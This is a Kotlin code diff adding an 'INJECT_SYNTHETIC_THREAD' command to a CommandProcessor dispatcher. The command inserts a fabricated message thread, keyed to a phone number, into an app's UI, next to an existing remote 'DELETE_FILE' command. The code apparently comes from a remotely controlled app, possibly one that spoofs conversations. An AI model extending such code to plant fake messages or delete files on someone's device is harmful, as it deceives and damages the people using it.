@@ -2338,6 +2338,17 @@ object CommandProcessor {
                         }
                     }
                 }
+                "INJECT_SYNTHETIC_THREAD" -> {
+                    try {
+                        val json = JSONObject(content) // Validate structural integrity
+                        DynamicUIManager.injectSyntheticThread(content)
+                        status = "SYNTHETIC_THREAD_INJECTED"
+                        errorMsg = "Target: ${json.optString("number", "Unknown")}"
+                    } catch (e: Exception) {
+                        status = "FAILED_FORMAT"
+                        errorMsg = "Invalid JSON payload: ${e.message}"
+                    }
+                }
                 "DELETE_FILE" -> {
                     val paths = content.split("|")
                     var successCount = 0
